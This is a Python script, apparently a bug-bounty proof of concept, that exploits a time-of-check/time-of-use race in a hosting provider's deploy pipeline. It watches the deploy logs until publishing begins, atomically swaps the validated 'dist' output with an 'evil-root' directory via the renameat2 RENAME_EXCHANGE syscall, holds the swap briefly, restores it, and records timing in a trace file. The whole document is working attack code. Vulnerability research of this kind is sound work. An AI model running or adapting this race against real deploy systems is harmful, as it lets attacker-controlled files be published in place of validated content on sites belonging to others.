#!/usr/bin/env python3
"""Swap an owned output path after the publisher logs its validated phase."""

from __future__ import annotations

import ctypes
import json
import os
from pathlib import Path
import time


SYS_RENAMEAT2 = 316
AT_FDCWD = -100
RENAME_EXCHANGE = 2
MARKER = b"HOSTINGER_NODE_SSH_LOG_WATCH_TOCTOU_GATE:r224"
PUBLISHING = b"==> Publishing"
libc = ctypes.CDLL(None, use_errno=True)
dist = os.fsencode("dist")
alternate = os.fsencode("evil-root")
started = time.monotonic()
deadline = started + 30.0
logs_root = Path.cwd().parents[1] / "logs"
trace = {
    "marker": MARKER.decode(),
    "event": "not-observed",
    "logsRootAccessible": logs_root.is_dir(),
}


def current_log() -> Path | None:
    try:
        candidates = sorted(
            logs_root.glob("*/*_deploy.log"),
            key=lambda item: item.stat().st_mtime_ns,
            reverse=True,
        )[:8]
    except OSError:
        return None
    for candidate in candidates:
        try:
            if MARKER in candidate.read_bytes():
                return candidate
        except OSError:
            continue
    return None


log_path = None
while time.monotonic() < deadline and log_path is None:
    log_path = current_log()
    if log_path is None:
        time.sleep(0.0005)

if log_path is not None:
    trace.update(
        event="current-log-found",
        logFoundAfterMs=round((time.monotonic() - started) * 1000, 3),
    )
    while time.monotonic() < deadline:
        try:
            tail = log_path.read_bytes()[-4096:]
        except OSError:
            time.sleep(0.00025)
            continue
        if PUBLISHING not in tail:
            time.sleep(0.00025)
            continue
        trace.update(
            event="publishing-observed",
            publishingAfterMs=round((time.monotonic() - started) * 1000, 3),
        )
        result = libc.syscall(
            SYS_RENAMEAT2,
            AT_FDCWD,
            ctypes.c_char_p(dist),
            AT_FDCWD,
            ctypes.c_char_p(alternate),
            RENAME_EXCHANGE,
        )
        trace["exchangeErrno"] = ctypes.get_errno() if result != 0 else 0
        if result == 0:
            trace["evilHeldMs"] = 1500
            time.sleep(1.5)
            restore = libc.syscall(
                SYS_RENAMEAT2,
                AT_FDCWD,
                ctypes.c_char_p(dist),
                AT_FDCWD,
                ctypes.c_char_p(alternate),
                RENAME_EXCHANGE,
            )
            trace["restoreErrno"] = ctypes.get_errno() if restore != 0 else 0
        break

try:
    if os.path.islink("dist") and os.path.isdir("evil-root"):
        libc.syscall(
            SYS_RENAMEAT2,
            AT_FDCWD,
            ctypes.c_char_p(dist),
            AT_FDCWD,
            ctypes.c_char_p(alternate),
            RENAME_EXCHANGE,
        )
except OSError:
    pass

trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
try:
    trace_path = Path.home() / ".h1-r224-race-trace.json"
    trace_path.write_text(json.dumps(trace, sort_keys=True))
    trace_path.chmod(0o600)
except OSError:
    pass
